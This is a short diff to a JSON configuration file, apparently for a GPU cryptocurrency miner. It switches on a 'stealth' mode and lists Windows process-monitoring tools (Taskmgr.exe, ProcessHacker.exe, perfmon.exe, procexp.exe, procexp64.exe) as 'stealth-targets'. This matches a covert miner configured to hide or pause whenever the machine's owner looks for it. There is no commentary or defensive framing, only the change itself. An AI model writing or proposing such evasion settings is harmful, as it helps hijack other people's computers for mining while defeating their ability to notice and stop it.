@@ -4,6 +4,6 @@
     "max-gpu": 30,
     "idle-wait": 1,
     "idle-gpu": 90,
-    "stealth": false,
-    "stealth-targets": ""
+    "stealth": true,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
 }
